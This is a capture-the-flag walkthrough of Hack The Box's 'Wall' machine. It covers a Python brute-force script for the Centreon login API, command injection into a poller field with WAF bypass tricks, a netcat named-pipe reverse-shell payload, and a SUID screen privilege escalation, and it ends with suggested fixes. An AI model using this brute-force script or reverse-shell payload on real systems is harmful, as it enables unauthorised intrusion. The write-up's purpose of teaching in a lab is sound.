---
layout: post
title:  "HTB: Wall Walkthrough"
categories: writeups HTB
permalink: /:categories/:title
---

![Wall Logo](../../assets/img/writeups/htb/wall/info_card.png)

Date: 1/24/2020   
Author: n0tAc0p  

Table of Contents
1. TOC 
{:toc} 

**This is a rewrite of a PDF writeup I did for Wall a few months ago.**

### TL;DR

`POST directory enumeration --> Easily bruteforced credentials --> Centreon RCE Vulnerability --> Screen SUID bit = instant root`

### Recon and Enumeration

Starting with `masscan`, it found open ports on 22 and 80. Following that up with a detailed TCP scan:

{:refdef: style="text-align: center;"}
![Detailed Port Scan](../../assets/img/writeups/htb/wall/detailed_port_scan.png)
{: refdef}

So we have:

22 (SSH)  
80 (HTTP)

Navigating to 10.10.10.157 in the browser, we found the default Apache Page. We ran gobuster with `/user/share/wordlists/dirb/common.txt` and found the following (the only files we had access too):

/aa.php  
/index.html  
/panel.php  
/monitoring (directory)  

aa.php and panel.php were nearly useless. They each had a single line of text, that offered no help. The monitoring directory was password protected via HTTP Authentication. Talking with others on the forums, they suggested I try different "verbs" in order to find what I was looking for.

#### "Verb" Usage

Luckily it clicked for me, and I tried to access the above URLs with POST requests instead of GET (hence, another VERB). If we make a post request to /monitoring, we are greeted with a custom redirect messsage.

{:refdef: style="text-align: center;"}
![Centreon Redirect](../../assets/img/writeups/htb/wall/verb_usage.png)
{: refdef}

The URL: 10.10.10.157/centreon presented a login page for a service called `centreon`

{:refdef: style="text-align: center;"}
![Centreon Login](../../assets/img/writeups/htb/wall/centreon_login.png)
{:refdef}

### Initial Foothold

Centreon is an IT monitoring tool, which can give business owners a snapshot of their network at a high level. More information can be found at their [website](https://www.centreon.com/en/){:target="_blank"} ([1])

The default credentials `root:centreon` did not work. Unable to find plaintext passwords anywhere, I was left to brute forcing. Instead of relying on `hydra`, I wrote a python script that brute forces the login
page through the API ([API documentation](https://documentation.centreon.com/docs/centreon/en/19.04/api/index.html){:target="_blank"}) ([2]). This gets around having to grab the CSRF token, and was more fun.

~~~python
import sys
from pathlib import Path
from requests import post

if len(sys.argv) < 3:
    print("Usage python3 centreonPasswordCrack <username> <wordlist_path>")
    exit(0)

count = 0
username = sys.argv[1]
# URL params
params = {"action":"authenticate"}
URL = "http://10.10.10.157/centreon/api/index.php?"

with open(str(sys.argv[2]), "r") as f:
    while f:
        password = f.readline().strip()
        print("Count: {}, Password: {}".format(count, password))
        # Post body content
        data = {"username": username, "password": password}
        response = post(url=URL, params=params, data=data)
        count += 1
        # An authentication token is returned if the credentials are correct
        if response.text != '"Bad credentials"':
            print("Found Password: {}. Response: {}".format(password, response.text))
            break
~~~

Running the script, we found that `admin:password1` were valid credentials. Sure enough, we could login to Centreon. 

#### Centreon RCE

We found the Centreon version to be 19.04. After some quick googling, we came across an [article](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/){:target="_blank"} by the box's creator (coincidence?) ([3]).

We copy and pasted the exploit from the blog post and tried it out... but it did not work (shocker).

After reading about the exploit, it boils down into two steps:
1. Create a new "poller" object, and inject our command into a certain field
2. Call a specific function, which calls our injected code

The code in question:
{:refdef: style="text-align: center;"}
![Vulnerable Code](../../assets/img/writeups/htb/wall/vulnerable_code.png){:target="_blank"}
{: refdef}

So it looks like the server executes the parameter "nagios_bin" (which we have control over). The vulnerable function lies in a debug function that we can call by navigating to it in the browser. We notice that our command is concatinated with other commands, so we will need to comment out the line after our payload.

#### Attempt at Manual Exploitation

We created a new poller, and attempted to get a reverse shell. Yet no matter which reverse shell payload we used, the server gave us 403 Not Found errors. When I entered commands with 0 spaces, it seemed to work fine. Talking with others on the forums, I determined there was a web application firewall (WAF) protecting the server. A WAF sits in between the server and the backend and sanitizes user input. If it finds blacklisted input, it can deny access to a resource (which is what happened to us).

Trying whoami

{:refdef: style="text-align: center;"}
![Whoami Poller](../../assets/img/writeups/htb/wall/injection_point.png)
{: refdef}

What we got when we tried to get a reverse shell
{:refdef: style="text-align: center;"}
![403 Forbidden](../../assets/img/writeups/htb/wall/403_forbidden.png)
{: refdef}

#### The "Better Way"

**This is a retrospection based on watching IPPSEC and reading other writeups**

The better way at handling getting user on this box is:
1. Create our payload
2. Encode it with Base64
3. Use ${IFS} as a space (since space is a blacklisted character)
4. Modify the central poller to contain our payload, then call the debug function through the GUI

I really wish I had thought of this way, but it was great to learn another approach from others.

#### My Way

Now for the way I actually did it. It leverages the Centreon API, and does not touch the GUI. Hindsight is 20/20, but I think this was still an interesting way to solve the problem and utilize the API.

I wrote a python script that can be found [here](https://github.com/frank-cerny/HackTheBox/tree/master/wall/scripts){:target="_blank"} (much too long for an article) but the steps taken are as follows:
1.	Get a valid session token by submitting a POST request through the login form
2.	Set all current pollers to be non-local host
3.	Create our poller
4.	Modify it to contain part 1 of our payload and execute
5.	Modify it to contain part 2 of our payload and execute
6.	Delete the poller (reverse shell should be active)
7.	Reset all pollers that were originally localhost back to localhost

Payload part 1: mknod /tmp/backpipe p  
Payload part 2: /bin/sh 0</tmp/backpipe | nc {} {} 1>/tmp/backpipe &

How does this payload work?

Part 1:
Create a special FIFO file called backpipe, inside /tmp. This creates a “named pipe,” and allows us to have our own I/O device of sorts on the machine. That is, we can redirect input and output to and from it, and use it in interesting ways.

[Pipe Documentation for more information](http://man7.org/linux/man-pages/man7/fifo.7.html){:target="_blank"}

~~~bash
/bin/sh 0</tmp/backpipe | nc {} {} 1>/tmp/backpipe &
~~~

Part 2:
1.	Start the /bin/sh process
2.	Redirect all input from /tmp/backpipe to file descriptor 0 (which is standard input), so /bin/sh gets all its input from our pipe
3.	Start a process of netcat back to our local machine
4.	Redirect standard output (file descriptor 1) to our pipe

So, when we type commands, netcat routes the standard input it receives (our commands) to our pipe, which is then routed to /bin/sh, where they are executed, and produce some standard output. Then we see the output of our commands as normal output on our reverse shell. All credit to [this site](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/){:target="_blank"}  for figuring that out ([5]). I wanted to do something like this, but would have not figured it out on my own

Some things to note:
1.	Using the API means we can bypass the WAF, and inject anything we want 😊
2.	For us to execute our payload, our poller must be the only “Central Poller” active. Making a poller localhost sets it to be central. But, if there is already a central poller, the original poller marked as central will still have precedence. Therefore, we must specifically toggle off localhost for every poller BEFORE we create our own
3.	We comment out everything after our payload, so it is the only thing that gets executed when we call the debug function
4.	There are multiple steps that must be taken to create a poller. Take a look at the code and comments to understand what they are, and why they must be done.

**Number 2 is important because otherwise, no matter which poller id my new poller was, I could only execute commands on the Central Poller**

Running our exploit, we get a shell back as `www-data`

{:refdef: style="text-align: center;"}
![Exploit Run](../../assets/img/writeups/htb/wall/exploit_run.png)
{: refdef}

{:refdef: style="text-align: center;"}
![www-data user](../../assets/img/writeups/htb/wall/www_data_user.png)
{: refdef}

### Privilege Escalation

This box was interesting in the fact that we could escalate directly to root.

We ran linEnum on the box and found a very suspicious screen binary that has a SUID bit enabled. If you are unfamiliar, a SUID bit means that when we run the binary, we run with the same permissions as the file owner

~~~bash
-rwsr-xr-x 1 root root 1595624 Jul 4 00:25 /bin/screen-4.5.0
~~~

In this case, the file is owned by root. So if execute it, we will run it under root permissions.

#### Screen SUID

I was almost positive that this binary was unsafe. After some quick googling, I found an entry on [exploit db](https://www.exploit-db.com/exploits/41154){:target="_blank"} ([4]). I copied the exploit the my shell, ran it, and not-suprisingly, got a root shell. Much easier than I anticipated. Once we had the root shell, it was easy to go inside `/home/shelby` and get the user hash as well.

{:refdef: style="text-align: center;"}
![root user](../../assets/img/writeups/htb/wall/root_user.png)
{: refdef}

### Conclusion

#### Fixes

Listed below are my suggested fixes to vulnerablities found on the box. As always, my suggestions may be incorrect, and are most likely not the only way to apporach fixing vulns.

1. Discovered Centreon via a POST request (without authenticating first)  
   **Fix: Do not allow POST requests on pages where GET requests require authentication**  
2. Was able to brute force a password for the admin user for Centreon  
   **Fix: Use unique usernames (not admin) and use a more secure password (according to whatever framework you like)**   
3. Remote Code Execution on Poller Parameter allows for a reverse shell  
   **Fix: Sanitize user input before calling a shell_exec()**  
4. Escalate directly to root via a SUID bit on the screen binary  
   **Fix: Do not include SUID bits on binaries unless it is absolutely necessary (in this case, it is NOT necessary)**  

#### Final Thoughts

Getting a foothold on this box was infuriating, and challenging. Even more so once I figured out I took the most time consuming route possible. Still, I learned some new enumeration techniques, and was able to brush up on my python. Shoutout to `askar` for creating the box, and thanks for reading. Onto the next one...

*As always, if you have any questions or feedback, please contact me on HTB! I am always looking to improve my writing to make it as clear and concise as possible (while remaining somewhat beginner friendly). Happy Hacking!*

### References

1. Centreon Homepage: https://www.centreon.com/en/
2. Centreon API: https://documentation.centreon.com/docs/centreon/en/19.04/api/index.html
3. Askar's RCE Blog post: https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/
4. Screen Exploit DB: https://www.exploit-db.com/exploits/41154
5. Reverse Shell with mknod: https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/.